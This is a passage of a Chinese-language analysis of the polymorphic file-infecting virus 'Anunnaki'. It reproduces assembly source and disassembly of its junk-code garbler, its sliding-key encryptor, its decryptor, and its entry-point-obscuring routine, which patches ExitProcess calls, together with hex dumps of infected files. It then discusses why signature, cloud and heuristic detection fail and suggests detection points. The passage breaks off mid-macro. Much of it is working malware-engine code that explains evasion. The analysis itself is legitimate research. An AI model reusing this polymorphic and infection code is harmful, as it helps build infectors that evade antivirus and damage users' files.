1. 检测配置中是否设置 `loop` 方式，随机设置 `loop` 的循环次数，范围 `10000h` ~ `1000h`
2. 初始化 `loop` 所用的寄存器
3. 产生一个对 `rx` 赋值循环计数的指令，支持的格式包括 `mov rx,cnt` / `lea rx ,[cnt]` / `push cnt ,pop rx`
4. 在 `loop` 插入仿真无效指令
5. 递减计数

### `Garble_Loop`

```
    call Is_In_Loop  
    test eax,eax  
    jnz Garble_Loop_End  
    cmp ecx,5  
    jbe Garble_Loop_End  
    call get_free_reg_32  
    cmp eax,-1  
    je Garble_Loop_End  
    call Set_In_Loop ; 保存设置  
    mov ebx,eax  
    mov eax,POLY_LOOP_ITERATION_MAX ;   最大 loop 计数  
    call random  
    add eax,POLY_LOOP_ITERATION_MIN   ; 获得一个随机的 loop 计数  
    push ecx  
    mov ecx,eax  
    call Asm_Mov_Reg_Imm_32          ;产生一个 mov rx ，imm32 指令  
    pop ecx  
    push edi  
    push ebx  
    dec ecx  
    call Garble ;插入无效指令  
    pop eax  
    mov ebx,eax  
    call unset_reg_32 ; 递减计数    
    mov al,48h  
    add al,bl  
    stosb  
    mov al,085h ;测试计数  
    stosb  
    mov eax,ebx  
    rol eax,3  
    add eax,ebx  
    add eax,0c0h  
    stosb  
    pop eax ; 产生一个 jcc  
    sub eax,edi  
    push eax  
    not eax  
    cmp eax,255 / 2  
    pop eax  
    jbe Garble_Loop_Short  
    sub eax,6    ;产生一个 near jcc  
    mov word ptr [edi],0850fh  
    mov dword ptr [edi + 2],eax  
    add edi,6  
    jmp Garble_Loop_Cont        ;产生一个 short jcc          
```

\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

经过上述变换，产生的无效指令效果如下，可以看到如果不经过分析，是不容易利用程序分析出这些是无效指令的。

### `loop`

```
    00A00298    68 DE320000     push 32DE  
    00A0029D    5E              pop esi  
    00A0029E    337C24 00       xor edi,dword ptr ss:[esp]  
    00A002A2    4E              dec esi  
    00A002A3    85F6           test esi,esi  
    00A002A5  ^ 75 F7          jnz short 00A0029E  
```

### `push`/`pop`

```
    00A009D8    54              push esp  
    00A009D9    8B5C24 00       mov ebx,dword ptr ss:[esp]  
    00A009DD    5A              pop edx  
    00A009DE    BF 7B3DF36F     mov edi,6FF33D7B  
    00A009E3    FF75 F0         push dword ptr ss:[ebp-10]  
    00A009E6    53              push ebx  
```

### `jump`

```
    00A009EB  /74 04            je short 00A009F1  
    00A009ED  |40               inc eax  
    00A009EE  |66:33F0          xor si,ax  
    00A009F1  \\FF7424 00       push dword ptr ss:[esp]  
    00A009F5    4A              dec edx  
    00A009F6    8BC0            mov eax,eax  
    00A009F8    5B              pop ebx  
```

### `imm`

```
    00A00A06    BB 14C44F40     mov ebx,404FC414  
    00A00A0B    33DE            xor ebx,esi  
    00A00A0D    0B4D 00         or ecx,dword ptr ss:[ebp]  
    00A00A10    8B7D 00         mov edi,dword ptr ss:[ebp]  
```

### `mod/rm`

```
    00A009CA    8D15 2C8A0000   lea edx,dword ptr ds:[8A2C]  
    00A009D0    66:33C0         xor ax,ax  
    00A009D3    4A              dec edx  
    00A009D4    85D2            test edx,edx  
    00A009D6  ^ 75 F8           jnz short 00A009D0  
```

### `call`

```
    00A02B10    E8 03000000     call 00A02B18  
    00A02B15    234D 00         and ecx,dword ptr ss:[ebp]  
    00A02B18    5F              pop edi  
    00A02B19    81C7 EBD45FFF   add edi,FF5FD4EB  
    00A02B1F    81C7 F52AA000   add edi,0A02AF5  
    00A02B25    8B4C24 00       mov ecx,dword ptr ss:[esp]  
```

### 2.5.3 `poly` engine 的实现

`ope` 采用的是随机密钥+滑动密钥方案，加密支持的指令为(`xor` / `sub` / `add`),滑动密钥支持的指令为（`sub` / `add` / `xor`),加密中 `ope` 维护一个 `poly_vars` 结构体，定义如下:

```
poly_vars struct  
   poly_ptr_code_base_va     dd  ?      ;   要加密数据的 virtual-address  
   poly_ptr_code_base_raw    dd  ?      ;   要加密数据的 raw-address  
   poly_ptr_decrypt_buf_va   dd  ?      ;     
   poly_code_size            dd  ?      ;   加密数据的 size  
   poly_code_entry_offset    dd  ?      ;   加密数据的相对 ep  
   poly_decryptor_base       dd  ?      ;   解密数据的地址（相对虚拟地址），指向 virus_body,而不是开头的 Gen trash data.  
   poly_decryptor_base_va    dd  ?      ;   解密数据的 virtual-address  
   poly_decryptor_size       dd  ?      ;   解密数据的 size   
   poly_options              dd  ?      ;   poly 的设置信息  
   poly_garbage_level        dd  ?      ;   产生仿真无效指令的等级 (1-低 3-中 5-高)  
   poly_read_mem_base        dd  ?      ;     
   poly_read_mem_size        dd  ?      ;     
   poly_algo1                dd  ?      ;   加密算法定义（3 种方案）  
   poly_algo2                dd  ?      ;   滑动密钥算法（2 种方案）  
   poly_key                  dd  ?      ;   encrypt key  
   poly_slide_key            dd  ?      ;   slide key   
   poly_ptr_reg              dd  ?      ;   内存寻址时使用的 register  
   poly_key_reg              dd  ?      ;   保存解密的密钥的 register  
   poly_loop_reg             dd  ?      ;   循环计数  
   poly_store_reg            dd  ?      ;   mov_data_loop 时有效  
   poly_junk_mem_reg         dd  ?      ;   下面几个都是产生仿真无效指令的结构，之前已经分析过  
   poly_junk_mem_pos         dd  ?      ;    
   poly_reg_usage            dd  ?      ;    
   poly_random_seed          dd  ?      ;    
   poly_garbler_flags        dd  ?      ;    
   poly_entry_offset         dd  ?      ;    
   poly_subroutines_count    dd    ?  ; 仅在产生 sub_call 时有效  
   poly_subroutines_table    db    1024 DUP(0)  
poly_vars ends  
```

根据 `poly_vars` 里面数据（`poly_algo1`、`poly_algo2`）配置，可产生不同的加密方案。

整体的加密过程如下:



# 步骤详解

1. 进行初始化工作，调用 `PolyInit(清 0, [poly_vars->poly_algo1 ~ poly_entry_offset])`，设置 `esp`, `ebp` 为使用的寄存器，初始化随机种子。
2. 为 `algo1` 随机选择一个加密算法，`algo1` 支持 3 种加密方式（`xor` / `add` / `sub`）；为 `algo2` 随机选择一个加密算法，`algo2` 支持 2 种加密方式（`add` / `sub`）。
3. 随机获得存储 `key` 寄存器、`loop` 寄存器、`slide_key` 寄存器，同时产生一个 32bit 的 `key`。
4. 加密病毒数据，由 4 部分组成（`Gen trash data + emulator instruction + virus body + Gen trash data`）。
5. 初始化生成解密的相关数据，如待解密数据地址等。
6. 在解密代码当前地址处插入仿真无效指令（包含随机的递归层数，所以从引擎设计角度讲该值不宜设置过大）。
7. 建立一个栈帧，`push ebp / mov ebp, esp`。
8. 同步骤 6。
9. 产生一个 `loop` 结构，一个 `lea rx, key` 指令。
10. 同步骤 6。
11. 产生一个获得 `virus size` 给 `rx`，可以通过 `push imm / pop rx`、`mov rx, imm`、`lea rx, [imm]`。
12. 同步骤 6。
13. 产生一个 `xor/add/sub [ptr_reg], key_reg` 结构的指令，指向要解密的数据同 `key` 运算。
14. 同步骤 6。
15. 产生一个 `(xor/add/sub key_reg, slide_key)` 结构的指令，`slide_key` 同 13 步的中间结果运算。
16. 同步骤 6。
17. 产生一个 `dec rx`，`rx` 为循环计数。
18. 同步骤 6。
19. 产生一个 `loop`。
20. 同步骤 6。

由于加解密算法的可逆关系，`ope` 记录了加密时的操作顺序。

---

## 产生密钥的算法

产生密钥的算法很简单：

```
generate_key_32:
   push ecx
   push ebx
   mov  ecx, 4

generate_key_loop:
   mov eax, 0ffh - 10
   call random
   add eax, 10
   mov bl, al
   rol ebx, 8
   dec ecx
   test ecx, ecx
   jnz generate_key_loop
   mov eax, ebx
   pop ebx
   pop ecx
   retn
```

## 加解密算法

采用的加密算法是在选择不同逻辑操作的同时，配合滑动密钥，下面给出加解密的公式：

- `X` --> 原始数据
- `Y` --> 加密后的数据
- `K` --> 32bit 的密钥
- `S` --> 32bit 的滑动密钥
- `L1` --> 加密逻辑 1（`sub` / `add` / `xor`）
- `L2` --> 加密逻辑 2（`sub` / `add`）

最终的加解密公式：

```
Y1 = L1(X, K);
Y  = L2(Y1, S);
```

代码如下（`key` 值保存在 `eax` 中）：

```
crypt_data:
  pushad
  mov edi, dword ptr [ebp].poly_ptr_code_base_raw
  mov ecx, dword ptr [ebp].poly_code_size
  mov ebx, dword ptr [ebp].poly_slide_key

crypt_loop:
  cmp dword ptr [ebp].poly_algo1, 1
  je crypt_algo1
  cmp dword ptr [ebp].poly_algo1, 2
  je crypt_algo2
  xor dword ptr [edi], eax
  jmp crypt_algo_c

crypt_algo1:
  sub dword ptr [edi], eax
  jmp crypt_algo_c

crypt_algo2:
  add dword ptr [edi], eax

crypt_algo_c:
  mov dword ptr [esp+1Ch], eax ; save eax
  cmp dword ptr [ebp].poly_algo2, 1
  je crypt_slide1
  cmp dword ptr [ebp].poly_algo2, 2
  je crypt_slide2
  xor eax, ebx
  jmp crypt_slide_c

crypt_slide1:
  sub eax, ebx
  jmp crypt_slide_c

crypt_slide2:
  add eax, ebx

crypt_slide_c:
  inc edi
  loop crypt_loop
  mov dword ptr [esp+1Ch], eax ; save eax
  popad
  retn
```

---

## Decryptor 代码分析

具体的 `poly engine` 实现可参考 `ope src`，为了便于分析，现将去除掉 `junk code` 后 `decryptor` 代码列出：

```
00A02D70    55              push ebp
00A02D71    8BEC            mov ebp, esp
00A02D73    E8 00000000     call 00A02D78
00A02D78    5E              pop esi
00A02D79    81C6 34B2BFFF   add esi, FFBFB234
00A02D7F    81C6 54204000   add esi, 402054
00A02D85    E8 00000000     call 00A02D8A
00A02D8A    59              pop ecx
00A02D8B    81C1 22B2BFFF   add ecx, FFBFB222
00A02D91    81C1 10000000   add ecx, 10
00A02D97    BA 5D0B0000     mov edx, 0B5D
00A02D9C    8B3E            mov edi, dword ptr ds:[esi]
00A02D9E    8939            mov dword ptr ds:[ecx], edi
00A02DA0    83C6 04         add esi, 4
00A02DA3    83C1 04         add ecx, 4
00A02DA6    4A              dec edx
00A02DA7    85D2            test edx, edx
00A02DA9  ^ 75 F1           jnz short 00A02D9C
00A02DAB    8D0D B0BF804A   lea ecx, dword ptr ds:[4A80BFB0]
00A02DB1    E8 00000000     call 00A02DB6
00A02DB6    5E              pop esi
00A02DB7    81C6 F6B1BFFF   add esi, FFBFB1F6
00A02DBD    81C6 C34D4000   add esi, 404DC3
00A02DC3    68 702D0000     push 2D70
00A02DC8    5A              pop edx
00A02DC9    010E            add dword ptr ds:[esi], ecx
00A02DCB    81E9 3B4390CD   sub ecx, CD90433B
00A02DD1    4E              dec esi
00A02DD2    4A              dec edx
00A02DD3    85D2            test edx, edx
00A02DD5  ^ 75 F2           jnz short 00A02DC9
00A02DD7    E8 00000000     call 00A02DDC
00A02DDC    59              pop ecx
00A02DDD    81C1 D0B1BFFF   add ecx, FFBFB1D0
00A02DE3    81C1 EC0E0000   add ecx, 0EEC
00A02DE9    51              push ecx
00A02DEA    C3              retn
```

去掉了 `junk code` 后的 `decryptor` 代码清晰，实际效果为 `decryptor` 完全混淆，很难辨认。

---

## 2.6 EPO Technology 实现

`Anunnaki` 在 `EPO` 方面使用稳妥的技术，解析被感染文件的 `IAT`，查找 `ExitProcess` / `exit` / `_exit` 函数，然后 `patch` 掉。该方法使得跟踪入口的 `emulator` 一定要等到程序退出时才会发现一些蛛丝马迹。当然也可以配合经验，检测前先对可疑的 `call` 进行分析，最大程度的找出 `exit` 点。

### 执行步骤

1. 定位被感染文件的 `options_header`，检测是否有 `import_table`。
2. 检测是否导入 `kernel32.dll` / `msvcrt.dll`。
3. 校验 `orignalFThunk`，`FirstThunk`。
4. 检测导入 APIs 的名字是否有 `ExitProcess` / `exit` / `_exit`，记录偏移地址。
5. 搜索 `code` 节，查找 `ff 15` / `ff 25`，匹配 `call` / `jmp` 处的偏移地址。
6. 按配置，1 -- 相对 `call` 的方式，0 -- 绝对 `call` 的方式，`patch` 掉原 APIs 调用，换成 `virus` 的 `ep`。

### Anunnaki EPO Code

```
00401226       /$  60                   pushad
00401227       |.  83EC 18              sub esp, 18
0040122A       |.  8BF4                 mov esi, esp
0040122C       |.  8BFE                 mov edi, esi
0040122E       |.  33C0                 xor eax, eax
00401230       |.  B9 06000000          mov ecx, 6
00401235       |.  F3:AB               rep stos dword ptr es:[edi]
00401237       |.  8B45 78             mov eax, dword ptr ss:[ebp+78]
0040123A       |.  8B40 68             mov eax, dword ptr ds:[eax+68]
0040123D       |.  85C0                test eax, eax
0040123F       |.  0F84 B8000000       je Anunnaki.004012FD
00401245       |.  E8 46010000         call <Anunnaki.RvaToRaw>
0040124A       |.  8BD0                mov edx, eax
0040124C       |>  837A 10 00          cmp dword ptr ds:[edx+10], 0
00401250       |.  77 05               ja short <Anunnaki.check_dll1>
00401252       |.  E9 86000000         jmp Anunnaki.004012DD
00401257       |>  8B42 0C             mov eax, dword ptr ds:[edx+C]
0040125A       |.  E8 31010000         call <Anunnaki.RvaToRaw>
0040125F       |.  E8 A5FFFFFF         call <Anunnaki.EPO_to_lower>
00401264       |.  8138 6B65726E       cmp dword ptr ds:[eax], 6E72656B
0040126A       |.  74 0D               je short Anunnaki.00401279
0040126C       |.  8138 6D737663       cmp dword ptr ds:[eax], 6376736D
00401272       |.  74 05               je short Anunnaki.00401279
00401274       |>  83C2 14             add edx, 14
00401277       |.^ EB D3              jmp short Anunnaki.0040124C
00401279       |>  833A 00             cmp dword ptr ds:[edx], 0
0040127C       |.  77 05               ja short Anunnaki.00401283
0040127E       |.  8B42 10             mov eax, dword ptr ds:[edx+10]
00401281       |.  EB 02               jmp short Anunnaki.00401285
```



```
00401283 |> 8B02 mov eax,dword ptr ds:[edx]
00401285 |> E8 06010000 call <Anunnaki.RvaToRaw>
0040128A |. 8BD8 mov ebx,eax
0040128C |. 33C9 xor ecx,ecx
0040128E |> 833B 00 cmp dword ptr ds:[ebx],0
00401291 |.^ 74 E1 je short Anunnaki.00401274
00401293 |. 8B03 mov eax,dword ptr ds:[ebx]
00401295 |. E8 F6000000 call <Anunnaki.RvaToRaw>
0040129A |. 83C0 02 add eax,2
0040129D |. 8138 65786974 cmp dword ptr ds:[eax],74697865 ; 'tixe'
004012A3 |. 74 21 je short Anunnaki.004012C6
004012A5 |. 8138 5F657869 cmp dword ptr ds:[eax],6978655F ; 'ixe_'
004012AB |. 74 19 je short Anunnaki.004012C6
004012AD |. 8138 45786974 cmp dword ptr ds:[eax],74697845 ; 'tixE'
004012B3 |. 75 0B jnz short Anunnaki.004012C0
004012B5 |. 8178 04 50726F63 cmp dword ptr ds:[eax+4],636F7250 ; 'corP'
004012BC |. 75 02 jnz short Anunnaki.004012C0
004012BE |. EB 06 jmp short Anunnaki.004012C6
004012C0 |> 41 inc ecx
004012C1 |. 83C3 04 add ebx,4
004012C4 |.^ EB C8 jmp short Anunnaki.0040128E
004012C6 |> 50 push eax
004012C7 |. 8B42 10 mov eax,dword ptr ds:[edx+10]
004012CA |. 8D0488 lea eax,dword ptr ds:[eax+ecx*4]
004012CD |. 53 push ebx
004012CE |. 8B5D 78 mov ebx,dword ptr ss:[ebp+78] ; pe_opt_header
004012D1 |. 0343 1C add eax,dword ptr ds:[ebx+1C] ; add imagebase
004012D4 |. 5B pop ebx
004012D5 |. 83C6 04 add esi,4
004012D8 |. 8906 mov dword ptr ds:[esi],eax
004012DA |. 58 pop eax
004012DB |.^ EB E3 jmp short Anunnaki.004012C0 ; 搜索代码节，0xff0x15，0xff0x25
004012DD |> 8B5D 70 mov ebx,dword ptr ss:[ebp+70] ; pe_sect_headers
004012E0 |. 8B43 14 mov eax,dword ptr ds:[ebx+14] ; PointerToRawData
004012E3 |. 0345 48 add eax,dword ptr ss:[ebp+48] ; MappedImage
004012E6 |. 8B4B 10 mov ecx,dword ptr ds:[ebx+10] ; SizeOfRawData
004012E9 |> 66:8138 FF15 cmp word ptr ds:[eax],15FF
004012EE |. 74 12 je short Anunnaki.00401302
004012F0 |. 66:8138 FF25 cmp word ptr ds:[eax],25FF
004012F5 |. 74 0B je short Anunnaki.00401302
004012F7 |> 40 inc eax
004012F8 |. 49 dec ecx
004012F9 |. 85C9 test ecx,ecx
004012FB |.^ 75 EC jnz short Anunnaki.004012E9
004012FD |> 83C4 18 add esp,18
00401300 |. 61 popad
00401301 |. C3 retn
00401302 |> 50 push eax
00401303 |. 8B40 02 mov eax,dword ptr ds:[eax+2]
00401306 |. 56 push esi
00401307 |> 833E 00 /cmp dword ptr ds:[esi],0
0040130A |. 74 09 |je short Anunnaki.00401315
0040130C |. 3B06 |cmp eax,dword ptr ds:[esi]
0040130E |. 74 09 |je short Anunnaki.00401319
00401310 |. 83EE 04 |sub esi,4
00401313 |.^ EB F2 \\jmp short Anunnaki.00401307
00401315 |> 5E pop esi
00401316 |. 58 pop eax
00401317 |.^ EB DE jmp short Anunnaki.004012F7
00401319 |> 83BD 84000000 00 cmp dword ptr ss:[ebp+84],0 ; 比较 patch 的方式
00401320 |. 74 02 je short Anunnaki.00401324 ; 1 -- 相对 call 的方式
00401322 |. EB 27 jmp short Anunnaki.0040134B ; 0 -- 绝对 call 的方式
00401324 <epo_relative_patch>|> 8B4424 04 mov eax,dword ptr ss:[esp+4] ; 要 patch 的地址给 eax，即 ff 15 /ff 25 的地址
00401328 |. E8 68000000 call Anunnaki.00401395 ; RawToVa
0040132D |. 85C0 test eax,eax
0040132F |.^ 74 E4 je short Anunnaki.00401315
00401331 |. FF85 80000000 inc dword ptr ss:[ebp+80] ; number_of_epo_patches 加 1
00401337 |. 8B5D 7C mov ebx,dword ptr ss:[ebp+7C] ; decryptor_ep_VA -> eax
0040133A |. 2BD8 sub ebx,eax ; 得到相对偏移
0040133C |. 83EB 05 sub ebx,5
0040133F |. 8B4424 04 mov eax,dword ptr ss:[esp+4] ; 得到 ff 15/ff 25 的地址偏移
00401343 |. C600 E8 mov byte ptr ds:[eax],0E8 ; 写入，产生一个 call
00401346 |. 40 inc eax ; 跳过 0xe8
00401347 |. 8918 mov dword ptr ds:[eax],ebx ; 产生一个 call offset
00401349 |.^ EB CA jmp short Anunnaki.00401315
0040134B <epo_absolute_patch>|> 8B4424 04 mov eax,dword ptr ss:[esp+4] ; 得到 ff 15/ff 25 的地址偏移
0040134F |. 8B5D 7C mov ebx,dword ptr ss:[ebp+7C] ; decryptor_ep_VA -> ebx
00401352 |. 8958 02 mov dword ptr ds:[eax+2],ebx ; 跳过 ff 15/ff 25,2 个字节写入绝对偏移的地址
00401355 |. FF85 80000000 inc dword ptr ss:[ebp+80]
0040135B \\.^ EB B8 jmp short Anunnaki.00401315
0040135D . 53 push ebx
0040135E . 51 push ecx
0040135F . 52 push edx
00401360 . 8B4D 78 mov ecx,dword ptr ss:[ebp+78]
00401363 . 2B41 1C sub eax,dword ptr ds:[ecx+1C]
00401366 /> 8B5D 70 mov ebx,dword ptr ss:[ebp+70]
00401369 |. 8B4D 74 mov ecx,dword ptr ss:[ebp+74]
0040136C |> 8B53 0C /mov edx,dword ptr ds:[ebx+C]
0040136F |. 3BC2 |cmp eax,edx
00401371 |. 72 0C |jb short Anunnaki.0040137F
00401373 |. 0353 08 |add edx,dword ptr ds:[ebx+8]
00401376 |. 3BC2 |cmp eax,edx
00401378 |. 72 09 |jb short Anunnaki.00401383
0040137A |. 83C3 28 |add ebx,28
0040137D |.^ E2 ED \\loopd short Anunnaki.0040136C
0040137F |> 33C0 xor eax,eax
00401381 |. EB 09 jmp short Anunnaki.0040138C
00401383 |> 2B43 0C sub eax,dword ptr ds:[ebx+C]
00401386 |. 0343 14 add eax,dword ptr ds:[ebx+14]
00401389 |. 0345 48 add eax,dword ptr ss:[ebp+48]
0040138C |> 5A pop edx
0040138D |. 59 pop ecx
```



```
0040138E       |.  5B                       pop ebx  
0040138F       |.  C3                       retn  
```

### 2.7 感染后文件对比

对同一个文件（`1.exe`/`2.exe`），分别进行一次感染，对比情况如下:

#### `1.exe)`

```
00000430  38 20 00 00 00 00 00 00 80 00 45 78 69 74 50 72  8 .......ExitPr
00000440  6F 63 65 73 73 00 6B 65 72 6E 65 6C 33 32 2E 64  ocess.kernel32.d  ------------- 下面是感染的部分      ---------------  
00000450  6C 6C 00 00 7F FE 49 48 0E BA A1 EE 45 BC 63 D0  ll..H 骸?
00000460  87 7D 09 E7 91 C0 10 EB 22 E4 17 B0 EF 51 12 7E  .???帮 Q~
00000470  91 2A 9B 10 FD B6 92 83 C8 FB DE BC FA 69 9E 5C  ??塞藜
00000480  B2 A3 B4 58 E6 70 4B 00 E6 5D 95 6D 6A D5 5B 9F  玻 K.j?
00000490  AD D6 B7 B0 3D 8F 52 09 3F 39 9D 88 5E 00 8E DA  钒=.?9^.
000004A0  06 78 7C 75 A2 D6 FB 6C 16 07 E1 46 05 66 0C D5  x|u⒅f.?
000004B0  40 CD 48 1E C8 2C 26 CF EC CA AF 41 81 32 84 4B  @?&响石 A?
000004C0  4B F8 09 E6 CC 33 11 12 41 10 34 A9 FA 67 61 40  K?嫣 3A4ga@
000004D0  07 5B F3 4F 59 F2 05 14 B4 F8 9B 09 9E 9C 8B 66  \[Y?带?
000004E0  19 14 4F F6 B5 A7 82 80 29 4D 7B 84 63 16 A9 F7  O 龅)M{
000004F0  21 08 07 2F F3 D1 9F 3D 4D 74 1D A9 C1 F5 F1 18  !/笱?Mt┝躐
00000500  DA F1 6C 2F 53 52 66 B7 1F 64 94 14 87 5D 2F A5  隈 l/SRf?d?/?
00000510  AE 3B 71 B0 5B DB 73 97 83 B0 F4 46 C8 ED D9 E1  ?q 棒 F 软籴
00000520  8D 2D 8A 14 72 D8 1E 76 E4 14 DD 0E 84 C4 CC 3B  ??r?v???
00000530  3C 88 AC D7 71 AA 62 C9 9F 90 3A B6 18 37 03 6B  <??7k
00000540  97 F2 62 60 83 1E 47 08 B3 29 2E DA 24 0D A6 F7  b\`?G?.?.
00000550  8D BB 82 F9 13 44 3F 8A BA D3 6E CD 03 8F 55 C2  D???
00000560  87 1E 5C 19 E6 E8 BB 97 74 D8 AD 3A D8 E1 5D 04  ?\\骅 t 丨:蒯\]
.... 省略
```

#### `2.exe)`

```
00000430  38 20 00 00 00 00 00 00 80 00 45 78 69 74 50 72  8 .......ExitPr
00000440  6F 63 65 73 73 00 6B 65 72 6E 65 6C 33 32 2E 64  ocess.kernel32.d    ------------- 下面是感染的部分      ---------------         
00000450  6C 6C 00 00 36 07 F1 91 71 5B 15 E7 A5 25 0D 2B  ll..6q\[绁%.+
00000460  CD B8 B2 7A 73 21 D1 8A 5B B5 7B A8 69 64 97 E7  透 s!\[d
00000470  5A 44 F1 77 26 3F 50 6C 22 9F 37 9C DC 13 02 8F  ZD&?Pl"??
00000480  B6 22 44 4A 3A AC 47 C5 DB B0 66 72 09 8B 70 09  ?DJ:袍 r..
00000490  22 DA 8E B3 A6 94 30 17 15 CC EC 5F 92 18 F3 B0  "肠?天\_?蟀
000004A0  53 1F 3C 6B 81 53 EE 27 E5 86 D4 8D EE 6E D3 FF  S<k??
000004B0  CB AD F3 6D 6C C3 5F A7 1B B9 E6 CB 21 BB 7F 64  谁 l?规??d
000004C0  47 1A D5 46 18 11 EE 22 A5 EB 54 39 44 52 26 E3  G?ルT9DR&?
000004D0  DA 02 5C F7 5C 91 92 68 F1 81 B1 F8 49 B2 8D 9F  ?\\h 兵 I?
000004E0  FA ED 9E 2B CF 69 D1 63 E1 43 2F 78 37 4C 79 39  ?/x7Ly9
000004F0  8F 4B FE 16 19 95 24 09 F8 9C 95 DE 19 F6 36 D4  ??.??
00000500  AD D1 4D 08 C0 10 9B 15 35 BA 57 7A FB AD 2A 3E  M??5z\*>
00000510  03 23 3B 08 AD 30 8F 3C A3 D9 3B 74 DE D3 33 A6  #;??Ｙ;t 抻 3?
00000520  97 EC 78 05 CB 66 6F E6 33 14 51 EC 6E 12 FC 43  xo?Q
00000530  F8 62 D7 F5 01 F8 3F 90 24 B9 F0 AE A8 3C E3 57  柞??桂<
00000540  92 0C A1 36 60 CC 7D 14 B3 46 12 B9 15 8E C9 13  ??\`?
00000550  D5 4E 74 31 B5 89 74 81 08 2A 45 94 FD 5E 3A 00  t1t?\*E^:.
00000560  CE C9 B5 83 C6 CE AD 8C 19 4E 8E 7C 35 79 71 BE  紊莆 N5yq?
.... 省略
```

感染后的文件，不存在连续 2 字节相同的数据，这样通配符匹配、特征匹配方案全部失效。

### `[0x03].` 防御技术的困境

#### 1. 特征码的失效

对有简单加密多态类的感染式病毒，最好的特征检测方式是，基于通配符匹配和不相等字符数匹配方案，而且随着特征检测技术的研究的深入，也已经不再 是单纯的特征匹配，针对早期的加密多态，配合一个反汇编器，利用 `skeleton scanning` 原理先去除掉无效指令,再针对编写较为薄弱的 `decryptor` 继续通配符扫 描一般都可以有所斩获。

但对于 `Anunnaki` 这样的复杂感染病毒，在分析后可以确定，利用特征码是不能检测的，配合反汇编器也不行，因为 `decryptor` 的混淆做的很好，即便去除了大 部分 `junk code`,其余可变得关键代码一样无太多规律可寻。

#### 2. 关于主动防御技术

主动防御技术应该是最好的一种防御手段了，虽然从 `DOS` 时代就已经有了，但发展到今天仍然很难普及，原因在于，用户不可能都是熟练于网络安全的操作人员， 无法去分辨隐藏于安全操作后面的种种恶意手段，因此，主动防御是成也萧何败也萧何，用的好的“百毒不侵"，用不好的繁琐郁闷。因此摒弃白名单智能化的 `HIPS` 应该是研究的方向了。

#### 3. 关于”云“安全技术

抱歉，对待这一技术在 `anti virus` 方面的应用，我始终谨小慎微，或许我根本就不理解“云”安全的应用，所以在这里谈论这点似乎已经与技术无关了。有 一点不可否认的是，“云“安全技术从用户角度来看，它带了更多的防护手段，无论它后台使用了什么技术（并行处理、网格计算，未知病毒行为判断等等吧）,对 用户来说，它终究是体现了 `av` 厂商的努力同时也带来了新的防护体验。

作为 `coder`，我却固执的认为计算机安全的终极对抗是客户端的防护，也就是防护能力与检测能力，以目前的环境来说，防护大于检测。它不需要新 的概念，只要你告诉用户，运行这个程序的风险是什么，仅此这一点就需要更多的安全研究人员继续努力，所以可以想象,一个复杂感染病毒流行时，“云”安全 技术能做到是什么。有意思的是，在大力宣传”云“安全技术的厂商中仅有 `Panda` 能检测来 `Anunnaki`，但确是报 `Suspicious file`，是启发式检测出来的。

#### 4. 关于启发式检测技术

启发式检测技术是对特征检测的一种强有力补充，在木马、后门，蠕虫泛滥的今天，设计一款优秀的启发式扫描器其复杂程度已经非常高了,以往的那种基于 程序特异性的,权值判断技术的启发式扫描器在今天的环境中已经无法继续应用了。

启发式检测技术最大的难点不是如何检测出所有的病毒，而是如何把握”平衡“，有着较高的病毒检出率，又保持很低的误报是很难做到的。同样启发式对于 误报的处理也非常困难，它不像是特征检测，作废误报特征，重新提取即可。当有误报发生时，启发式的检测规则要重新调整，同时兼顾以往该规则对同类病毒 木马的检出情况，常常会有，虽然避免了误报，但导致以往能检出的病毒木马失效的情况，这时还要继续分析，提取新的规则，保证不误报，还能达到以往检测效 果为止。或直到证明该规则是不可靠规则，作废为止。

基于对未知病毒防御的独特效果及自动化病毒特征提取方向上的需求，启发式检测技术作为反病毒研究领域里的高端技术仍然会不断的加强。

### `[0x04].` 寻找复杂病毒技术的漏洞

要想利用检测技术完全的检测出复杂病毒（仅指加密、多态、变形）具体家族，具体变种，很遗憾的说是非常困难的，虽然反病毒技术之前曾经是精确的 检测技术，因为这牵扯到检测出后如何清除病毒及修复被感染文件的问题。当这一问题被放宽松后就是如何最大程度的识别恶意程序或风险程序，哪怕是不准确 的家族名称，实际情况也确实如此，最为优秀的 `AVP`（卡巴斯基）也会对新产生的病毒误报家族或是变种。

所以对复杂病毒的检测，不一定要等到 `Payload` 执行（`av-vm` 要做到 `payload` 执行，得跳过重重障碍），而是在执行一部分时（如解密部分，或执行时堆栈出 现有些固有信息）就可予以报警。下面将分析 `Anunnaki` 执行 `payload` 前的可作为检测的信息。

#### 1. 重定位手段

重定位是病毒编写中不可缺少的手段，每一种重定位手段都需要记录，影响检测的就是与壳的执行代码会有相似的地方，所以重定位记录需配合其他的有效 信息来验证是否包含恶意代码片段。

`Anunnaki` 的重定位 `code` 如下:

```
call get_ep
...... ;所有病毒工作，如 get kernel base ，get APIs ，check files ,infect files
get_ep:
mov eax,dword ptr [esp]
sub eax,5  
retn   
```

同经典的 `Delta offset` 方式不同，不过对能进行入口跟踪的扫描器来说这很容易识别,对进行重定位的 `code`，启发式扫描器应该不局限于某个获取模式，而是 应该从获要分析的代码中有获得 `base address` 的行为来入手，这样才能一劳永逸。

#### 2. 跨节区跳转

跨节区跳转是壳常用的一个手段，不过作为感染式病毒，也从来不缺少这行为点，从重定位一样，也是启发式扫描器要捕获的行为点。

#### 3. 怪异的 `macros`

前面曾提到,`Anunnaki` 为了隐藏 `stack` 中的字符串，将字符拆成若个 `32bit` 的数值压入堆栈。

如要获得一个 `APIs name` ，通过调用宏

`push_sz <ExitProcess\000>`，编译后

```
.text:00401108 6A 00            push    0
.text:0040110A 68 65 73 73 00 push    737365h     
.text:0040110F 68 50 72 6F 63 push    636F7250h   
.text:00401114 68 45 78 69 74 push    74697845h    
.text:00401119 54               push    esp           
```

此时 `esp` 指向的字符串为"ExitProcess",此时关联的寄存器一定是 `esp`,所以对 `push esp` 后，堆栈的情况要进行分析，如果 `esp` 指向为敏感的 `APIs`，则该情况 要记录。

`Anunnaki` 的实现方式如下:

```
push_au   macro   au, fstr
  local   pvar, cnt, es, cn, idx1, idx2, len, ln
  local   hex, dcm, hid
  es = 0
  len = 0
  irpc   c1, <fstr>
    len = len+1
    if es eq 1
      if (("
```



```asm
elseif ("&c" ge "0") and ("&c" le "9")  
    cn = (cn shl (4*hid)) + "&c" - "0"  
else  
    .err "push_ua: use \\XYY or \\xYY (Y can be 0-9,a-f,A-F)"  
endif  
hid = hid+1  
